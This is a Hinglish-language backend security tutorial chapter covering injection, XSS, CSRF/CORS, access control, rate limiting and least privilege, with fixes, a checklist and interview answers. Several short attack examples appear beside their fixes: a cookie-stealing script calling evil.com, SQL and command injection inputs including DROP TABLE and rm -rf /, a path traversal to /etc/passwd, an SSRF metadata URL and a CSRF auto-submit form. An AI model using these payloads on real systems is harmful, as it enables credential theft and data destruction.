Attack Surface — Poora Naksha

"Attack surface" ka matlab hai: har wo jagah jahan bahar se kuch andar aata hai. Ch 7 ka trust boundary yaad karo — ye usi ka security wala roop hai.

Injection — Ek Hi Root Cause

SQL injection, command injection, NoSQL injection, LDAP injection — sabki ek hi jadd hai: data ko code ki tarah interpret kar liya gaya. Jab tum user input ko ek string mein jodte ho jo baad mein parse hoti hai, tum user ko us language ka author bana dete ho.

SQL injection — aur asli fix
// ❌ String concatenation
db.query(`SELECT * FROM users WHERE email = '${email}'`);

// input: '  OR  '1'='1
// query: SELECT * FROM users WHERE email = '' OR '1'='1'   → SAARE users
// input: '; DROP TABLE users; --                          → aur bhi bura

// ❌ "Escaping" khud likhna — hamesha adhoora rehta hai
// charset, unicode, aur nested contexts mein bypass nikal aate hain

// ✅ PARAMETERIZED QUERY — asli fix
db.query("SELECT * FROM users WHERE email = $1", [email]);
// Kyun ye kaam karta hai: query ka STRUCTURE database ko alag se jaata hai,
// values alag se. Value chahe kuch bhi ho, wo VALUE hi rahegi —
// wo kabhi SQL syntax ban hi nahi sakti. Escaping nahi, SEPARATION.

// ⚠️ Par ek jagah parameterization KAAM NAHI karti — identifiers
// Column aur table names parameterize ho hi nahi sakte:
db.query(`SELECT * FROM orders ORDER BY ${sortField}`);   // ← INJECTABLE

// ✅ Iske liye ALLOWLIST hi ek raasta hai (ch 9 mein bola tha)
const SORTABLE = { created_at: "created_at", total: "total_paise" };
const col = SORTABLE[sortField];
if (!col) throw new ValidationError("invalid sort field");
db.query(`SELECT * FROM orders ORDER BY ${col}`);   // ab safe — value hamesha humari
injection ke doosre roop
// COMMAND INJECTION
exec(`convert ${filename} out.png`);       // ❌ filename = "x.png; rm -rf /"
execFile("convert", [filename, "out.png"]);  // ✅ shell hi nahi hai — args array

// NoSQL INJECTION — JSON body se operators aa jaate hain
db.users.find({ email: req.body.email });
// ❌ body: {"email": {"$ne": null}}  → sab match kar jayenge
// ✅ Fix: ch 7 ka schema validation — email STRING hona chahiye, object nahi

// PATH TRAVERSAL (ch 4 mein zikr tha)
fs.readFile(`/uploads/${req.params.file}`);  // ❌ ../../etc/passwd
const full = path.resolve("/uploads", req.params.file);
if (!full.startsWith("/uploads/")) throw new ValidationError();  // ✅

// SSRF — Server-Side Request Forgery (aksar bhoola jaata hai)
fetch(req.body.webhookUrl);   // ❌ url = "http://169.254.169.254/latest/meta-data/"
// ← cloud metadata endpoint se IAM CREDENTIALS mil jaate hain
// ✅ Fix: URL scheme allowlist (sirf https), resolved IP ko check karo
//    (private/link-local ranges block), redirects follow mat karo, aur
//    outbound calls ke liye ek egress proxy use karo.

XSS — Aur Wo Backend Ki Problem Kyun Hai

XSS mein attacker tumhare page ke context mein JavaScript chala deta hai — matlab wo user ke saare tokens, cookies (jo HttpOnly nahi hain), aur actions le sakta hai. Ye "frontend ka issue" lagta hai par backend do jagah zimmedaar hai: wo payload store karta hai, aur wo responses ka Content-Type aur headers set karta hai.

XSS — teen kism aur unka fix
// STORED — payload DB mein, har viewer ko chalta hai (sabse khatarnak)
// user bio: "<script>fetch('//evil.com?c='+document.cookie)</script>"

// REFLECTED — payload URL se seedha response mein
// /search?q=<script>…</script>  aur server usse HTML mein echo kar deta hai

// DOM-based — pura client-side (innerHTML se user input)

// ── Fix ka core: OUTPUT ENCODING, input sanitization nahi ────
// Kyun? Kyunki "safe" ka matlab CONTEXT pe depend karta hai —
// HTML body, HTML attribute, JS string, URL — chaaron mein alag escaping.
// Isliye storage pe nahi, RENDER ke waqt encode karo, us context ke hisaab se.

// Backend ki zimmedari:
res.json(data);   // ✅ Content-Type: application/json — browser use HTML nahi samjhega
// ❌ user content ko text/html mein bina encode kiye mat bhejo

// Rich text (bio, comments) allow karna hai? Toh SANITIZE karo, sahi library se —
// DOMPurify jaisi allowlist-based. Khud regex se tags hatana HAMESHA bypass hota hai.

// ── Security headers — backend set karta hai ─────────────────
app.use(helmet());   // sensible defaults, phir tune karo

Content-Security-Policy: default-src 'self'; script-src 'self'
// ← sabse strong XSS defense: inline scripts chalenge hi nahi
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff        // browser Content-Type guess na kare
X-Frame-Options: DENY                  // clickjacking
Referrer-Policy: strict-origin-when-cross-origin
🧠 XSS aur cookie flags ka rishta (ch 6 wapas)

Ch 6 mein bola tha: httpOnly cookie default honi chahiye kyunki CSRF ka fix hai, XSS-se-token-chori ka nahi. Yahan wo poori tarah clear hota hai — XSS ho jaaye toh localStorage ka token ek line JS se chala jaata hai, par httpOnly cookie JS padh hi nahi sakta. XSS phir bhi bura hai (attacker user ki taraf se requests bhej sakta hai), par token permanently churaya nahi ja sakta.

CSRF Aur CORS — Do Alag Cheezein

Ye do concepts sabse zyada confuse kiye jaate hain. Dono browsers se related hain, par ulte kaam karte hain:

CORSCSRF
Kya haiEk browser policyEk attack
Kya rokta/karta haiDomain A ka JS domain B ka response padhne se rokta haiAttacker site tumhari site pe request bhejwati hai
Key insightCORS request bhejne se nahi rokta — sirf padhne seIsiliye CORS CSRF ko rok nahi sakta
FixServer allowlist se origins allow kareSameSite cookie + CSRF token
CSRF kaise chalta hai, aur CORS kyun nahi bachata
// User bank.com pe logged in hai (session cookie hai).
// Phir wo evil.com kholta hai, jisme ye chhupa hai:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="50000">
</form><script>document.forms[0].submit()</script>

// Browser bank.com ki cookie APNE AAP attach karta hai (ch 3, ch 6).
// Server ke liye ye ek bilkul valid, authenticated request hai.
// CORS attacker ko RESPONSE padhne se rok dega — par usse farq hi nahi padta,
// kyunki transfer to ho CHUKA hai. Side effect ho gaya.

// ── Fix 1: SameSite cookie (aaj ka primary defense) ────────
res.cookie("sid", sid, { httpOnly: true, secure: true, sameSite: "lax" });
// Lax   = cross-site POST pe cookie nahi jayegi (top-level GET pe jayegi)
// Strict= kisi bhi cross-site request pe nahi (external links se bhi logout dikhega)

// ── Fix 2: CSRF token (defense in depth) ───────────────────
// Server ek random token deta hai; client usse HEADER mein bhejta hai.
// Attacker wo token padh hi nahi sakta (CORS use response padhne nahi deta —
// yahan CORS actually kaam aata hai), aur browser use apne aap attach nahi karta.

// ⚠️ CORS config ki common galtiyan
app.use(cors({ origin: "*", credentials: true }));  // ❌ browser reject bhi karega
app.use(cors({ origin: (o, cb) => cb(null, true) }));  // ❌ har origin reflect — "*" jaisa
app.use(cors({ origin: config.ALLOWED_ORIGINS, credentials: true }));  // ✅ allowlist

Broken Access Control — #1 OWASP Risk

OWASP Top 10 mein ye pehle number pe hai, aur wajah simple hai: iske liye koi clever exploit nahi chahiye — bas ek URL mein number badalna hai. Ch 6 ka IDOR yahi hai, ab poore roop mein.

access control ke chaar common holes
// ── 1. IDOR — ownership check hi nahi hai (ch 6) ───────────
const order = await db.orders.findById(req.params.id);   // ❌
const order = await db.orders.findOne({ id, userId: req.ctx.user.id }); // ✅
// Ownership QUERY mein — tab bhoolna structurally impossible hai.
// Aur not-found pe 404 do, 403 nahi — warna existence leak hoti hai.

// ── 2. Mass assignment (ch 7) ──────────────────────────────
await db.users.update(id, req.body);   // ❌ {"role":"admin"} bhej do
// ✅ .strict() schema + explicit input model jisme role hai hi nahi

// ── 3. Client se aayi identity pe bharosa ──────────────────
const userId = req.body.userId;      // ❌ client jo bhejega wahi
const userId = req.ctx.user.id;      // ✅ verified token/session se (ch 6)

// ── 4. Sirf UI mein chhupana ───────────────────────────────
// Admin button hide kar diya, par POST /admin/users abhi bhi khula hai.
// curl UI se guzarta hi nahi. Enforcement hamesha server pe.

// ── Structural fix: DEFAULT DENY ───────────────────────────
app.use(requireAuth);                       // sab kuch protected
app.use("/public", publicRouter);           // public EXPLICITLY whitelisted
// Ulta karne se (default allow + har route pe auth lagana) ek din koi bhool jaata hai.
// Default deny mein bhoolne ka nateeja "sab band" hai — jo turant pakda jaata hai.
🧠 OWASP API Top 10 ki bhasha — BOLA aur BFLA

API security mein isi cheez ke do specific naam hain, aur interviews mein ye terminology differentiate karti hai:

  • BOLA — Broken Object Level Authorization. "Kya ye user is object ko access kar sakta hai?" Fail hone ka matlab IDOR — /orders/1235. Ye API Top 10 ka #1 hai.
  • BFLA — Broken Function Level Authorization. "Kya ye user ye operation kar sakta hai?" Fail hone ka matlab: ek normal user DELETE /admin/users/5 call kar leta hai kyunki route pe role check hi nahi tha (ya sirf UI mein button chhupa tha).

Farq yaad rakhne ka tareeka: BOLA = galat data tak pahunch; BFLA = galat action tak pahunch. Dono ke structural fixes alag hain — BOLA ke liye ownership query mein, BFLA ke liye default-deny routing + role check group level pe (ch 4 ka route grouping).

Security Misconfiguration

Ye OWASP list mein hamesha upar rehta hai aur sabse "boring" category hai — koi clever exploit nahi, bas default settings jo kabhi badli hi nahi gayi. Aur yahi wajah hai ki ye itni baar hota hai.

MisconfigurationKya hota haiFix
Default credentials admin/admin — scanners inhe minutes mein dhoondh lete hain Deploy se pehle badlo; boot pe validate karo (ch 15)
Debug mode production mein Stack traces, env vars, aur SQL queries error page pe — attacker ko poora map NODE_ENV=production; 5xx pe generic message (ch 14)
Directory listing on /uploads/ khol ke sabki files dikh jaati hain nginx autoindex off
Admin/tooling endpoints khule /metrics, /debug/pprof, Kibana, Redis internet se reachable Internal network/VPN pe bind karo; security group (ch 2)
Verbose headers X-Powered-By: Express, Server: nginx/1.18.0 — exact version se known CVEs app.disable("x-powered-by"), server_tokens off
Cloud storage public S3 bucket public — ye ek classic real-world breach hai Block public access default; signed URLs
Missing security headers Koi CSP, HSTS, ya nosniff nahi helmet + CSP (upar §3)
Purani dependencies Known CVEs jinke exploits public hain Audit automate karo (§10)
⚠️ Error messages se information leak — ek subtle example

Login pe "email not found" aur "wrong password" alag messages dena user enumeration hai — attacker pehle valid emails ki list bana leta hai, phir unhi pe credential stuffing chalata hai. Yahi baat timing pe bhi lagti hai: agar user na milne pe response 5ms mein aata hai aur password galat hone pe 250ms (bcrypt), toh time se hi answer leak ho jaata hai — isliye user na milne par bhi ek dummy hash chalao (ch 6). Aur signup/password-reset pe bhi wahi generic response rakho.

Rate Limiting — Algorithms

Rate limiting teen alag problems solve karti hai: brute force / credential stuffing (ch 6), resource abuse aur cost control, aur DoS protection. Chaar algorithms, badhti hui accuracy ke saath:

AlgorithmKaiseTrade-off
Fixed window Har minute counter reset Simple, par boundary burst: 59s pe 100 + 61s pe 100 = 2 second mein 200
Sliding window log Har request ka timestamp store Bilkul accurate, par memory heavy
Sliding window counter Do windows ka weighted average Practical sweet spot — accurate enough, sasta
Token bucket Tokens fixed rate se bharte hain, request ek token leti hai Bursts allow karta hai — real user behaviour se sabse zyada milta hai
distributed rate limiting — atomicity zaroori hai
// ❌ Ye race condition hai — 10 instances, sab ek saath padh-likh rahe hain
const count = await redis.get(key);
if (count > LIMIT) return reject;
await redis.incr(key);

// ✅ Atomic — ek round trip, ek operation (ch 11 ka SET NX jaisa hi idea)
const count = await redis.incr(key);
if (count === 1) await redis.expire(key, windowSec);
if (count > LIMIT) {
  res.set("Retry-After", windowSec);   // ← ch 3: iske bina client aggressive retry karega
  return res.status(429).json({ error: "rate_limited" });
}
// Complex algorithms ke liye Redis Lua script — poori tarah atomic

// ── Kis key pe limit lagao — ye choice matter karti hai ────
// IP se       → NAT ke peeche poore office/college ko affect karta hai
// userId se   → behtar, par login se PEHLE user hai hi nahi
// API key se  → B2B ke liye sahi
// ✅ Login endpoint pe: IP AUR account dono pe — do alag attacks ke liye
//    (ek account pe brute force, aur ek IP se kai accounts pe stuffing)

// ⚠️ Proxy ke peeche real IP chahiye — X-Forwarded-For (ch 2).
//    trust proxy set nahi kiya toh sab requests 127.0.0.1 dikhengi aur
//    limit GLOBALLY trigger hoga — ek user sabko block kar dega.

TLS Aur Transport

  • HTTPS everywhere — internal service-to-service calls pe bhi. "Internal network safe hai" ek purani aur galat assumption hai (zero trust ka poora point yahi hai).
  • HSTS — Strict-Transport-Security browser ko batata hai ki is domain pe hamesha HTTPS use karo, taaki pehle HTTP request wala downgrade window bhi bandh ho jaaye.
  • Certificate expiry monitor karo — ye ek shockingly common outage cause hai. Auto-renewal (certbot, ch 2) lagao aur expiry pe alert bhi (ch 16), kyunki renewal bhi fail hoti hai.
  • Encryption at rest — DB, backups, aur S3 buckets. Aur PII/card data ke liye application-level encryption alag se.
  • Purane protocols band karo — TLS 1.2+ only.

Least Privilege Aur Blast Radius

Assume karo ki ek din kuch compromise hoga. Sawaal ye hai: us se kitna nuksaan ho sakta hai? Isko blast radius kehte hain, aur usse chhota karne ka tareeka least privilege hai.

least privilege — har layer pe
-- DATABASE: app ko superuser mat do
CREATE USER app_user WITH PASSWORD …;
GRANT SELECT, INSERT, UPDATE, DELETE ON … TO app_user;
-- DROP TABLE ka permission nahi → SQL injection ka nuksaan bhi limited
-- Read-only reporting ke liye alag user — analytics kabhi likh hi nahi sakta

// CLOUD IAM: "sab kuch allow" ki jagah specific resources
// ❌ s3:* on *      ✅ s3:GetObject on arn:aws:s3:::my-bucket/uploads/*

// CONTAINERS: non-root user, read-only filesystem, dropped capabilities
// NETWORK: DB sirf app subnet se reachable, internet se nahi (ch 2 ka security group)
// SECRETS: per-service credentials — ek leak sab kuch na khole (ch 15)

Dependencies Aur Supply Chain

Tumhare code ka zyadatar hissa tumne likha hi nahi hai. Ek typical Node app mein sainkdon transitive dependencies hoti hain, aur har ek tumhare process ke andar full access ke saath chalti hai.

  • Lockfile commit karo aur CI mein npm ci use karo — reproducible builds.
  • Audit automate karo — npm audit, Dependabot/Renovate. Par version bump ko blindly merge mat karo.
  • Typosquatting se bacho — reqeusts, lodahs jaise packages real hote hain aur malicious hote hain. Naya package add karte waqt naam dhyan se padho.
  • Postinstall scripts arbitrary code chalate hain — install ke waqt hi. CI mein --ignore-scripts consider karo.
  • Dependency count kam rakho — 3-line ke liye package add karna ek permanent attack surface add karna hai.

Security Checklist

  • ☐ Saari DB queries parameterized; identifiers (sort/filter columns) allowlisted
  • ☐ Input validation trust boundary pe, .strict() ke saath (ch 7)
  • ☐ Ownership check query ke andar; not-found pe 404 (ch 6)
  • ☐ Default deny — public routes explicitly whitelisted
  • ☐ Passwords bcrypt/argon2, ~200–300ms cost (ch 6)
  • ☐ Cookies: httpOnly; Secure; SameSite=Lax
  • ☐ Security headers (helmet) + CSP
  • ☐ Rate limiting — login pe IP aur account dono pe; Retry-After ke saath
  • ☐ Body size limit + validation depth limit (ch 5)
  • ☐ CORS allowlist se, reflect-all nahi
  • ☐ Secrets env/secret manager se; logs mein redacted (ch 15, 16)
  • ☐ 5xx responses mein internals nahi (ch 14)
  • ☐ DB user least privilege; internet se DB reachable nahi
  • ☐ Outbound URLs (webhooks) validated — SSRF
  • ☐ File uploads: size, MIME, content check; executable path se bahar store
  • ☐ Dependencies audited, lockfile committed
  • ☐ TLS everywhere; certificate expiry monitored
  • ☐ Auth events aur admin actions audit log mein (ch 16)

Key Takeaways

  • Security add-on feature nahi — har layer ke default decisions ka nateeja hai. Defence in depth: har layer maane ki upar wali fail ho sakti hai.
  • Saare injections ka ek hi root cause: data ko code ki tarah interpret karna.
  • Parameterized queries escaping nahi, separation hain — structure aur values alag jaate hain.
  • Identifiers (column/table names) parameterize nahi ho sakte — wahan allowlist hi ek raasta hai.
  • SSRF aksar bhoola jaata hai — user-supplied URL fetch karna cloud metadata se IAM credentials chura sakta hai.
  • XSS ka fix output encoding hai (context ke hisaab se), input sanitization nahi. CSP sabse strong defense hai.
  • httpOnly cookie XSS-se-token-chori rokti hai; localStorage nahi rok sakta.
  • CORS ek policy hai, CSRF ek attack. CORS request bhejne se nahi rokta — sirf response padhne se — isliye wo CSRF nahi rok sakta. CSRF ka fix SameSite + token hai.
  • Broken access control OWASP #1 hai kyunki isme koi exploit nahi lagta — bas URL mein ID badalni hai.
  • Default deny structural fix hai: bhoolne ka nateeja "band" hona chahiye, "khula" nahi.
  • Rate limiting atomic honi chahiye (INCR/Lua), Retry-After ke saath, aur login pe IP aur account dono pe.
  • Proxy ke peeche trust proxy na hone se rate limit sabko ek client samajh ke globally block kar deta hai (ch 2).
  • API terminology: BOLA = galat data tak pahunch (IDOR), BFLA = galat action tak pahunch (admin endpoint khula). Fixes alag hain.
  • Security misconfiguration mein koi exploit nahi lagta — default creds, debug mode, khule /metrics, verbose version headers, public S3.
  • Login pe alag error messages ya alag response timing = user enumeration. Generic message + dummy hash.
  • Least privilege blast radius chhota karta hai — app DB user ko DROP ka haq kyun ho?
  • Dependencies tumhare process mein full access ke saath chalti hain — lockfile, audit, aur kam dependencies.

🎯 Interview Questions

Q1. "SQL injection kaise rokoge? Escaping kaafi hai?"

Parameterized queries — aur wo escaping se behtar isliye hain kyunki wo escaping karte hi nahi: query ka structure DB ko alag se jaata hai aur values alag se, isliye value kabhi SQL syntax ban hi nahi sakti. Khud escaping likhna hamesha adhoora rehta hai (charset, unicode, nested contexts). Ek important exception: identifiers — column/table names parameterize nahi ho sakte, isliye ORDER BY ${field} ke liye allowlist chahiye. Aur defence in depth ke liye DB user ko least privilege do.

Q2. "CSRF aur CORS mein farq? CORS CSRF ko rok sakta hai?"

CORS ek browser policy hai, CSRF ek attack. Nahi, CORS CSRF ko nahi rok sakta — kyunki CORS request bhejne se nahi rokta, sirf cross-origin response padhne se rokta hai. CSRF mein attacker ko response chahiye hi nahi; usse bas side effect chahiye (transfer ho gaya). Fix: SameSite=Lax/Strict cookie (primary) + CSRF token (defence in depth) — token isliye kaam karta hai kyunki attacker use padh nahi sakta aur browser use apne aap attach nahi karta.

Q3. "Rate limiting kaise implement karoge, 10 instances ke saath?"

Shared store (Redis) chahiye, aur operation atomic hona chahiye — INCR + EXPIRE (ya complex algorithms ke liye Lua script). Get-then-set race condition hai. Algorithm: token bucket ya sliding window counter — fixed window mein boundary burst problem hai (59s pe 100 + 61s pe 100). Key selection matter karti hai: login pe IP aur account dono pe (do alag attacks). 429 ke saath Retry-After zaroori hai. Aur proxy ke peeche real client IP ke liye trust proxy — warna sab 127.0.0.1 dikhenge.

Q4. "OWASP #1 kya hai aur usse structurally kaise rokoge?"

Broken access control — IDOR, mass assignment, client-supplied identity, aur UI-only enforcement. Ye #1 isliye hai ki exploit trivial hai: URL mein ID badal do. Structural fixes, "yaad rakhna" nahi: ownership ko query ke andar daalo (findOne({id, userId: ctx.user.id})), input schema pe .strict() + explicit input model (server-controlled fields us model mein hon hi nahi), identity hamesha verified session/token se, aur default deny routing — public routes explicitly whitelist.

Q5. "Ek endpoint user ka diya hua URL fetch karta hai. Kya risk hai?"

SSRF. Attacker internal addresses de sakta hai — sabse khatarnak 169.254.169.254 (cloud metadata), jahan se IAM credentials mil jaate hain; ya internal admin services jo network-level pe "safe" maani gayi thi. Defences: scheme allowlist (sirf https), hostname resolve karke IP check karo aur private/link-local ranges block karo (DNS rebinding se bachne ke liye resolve-aur-connect ek saath), redirects follow mat karo, timeouts + response size cap, aur outbound traffic ko ek egress proxy se guzaro. Cloud pe IMDSv2 enforce karna bhi madad karta hai.
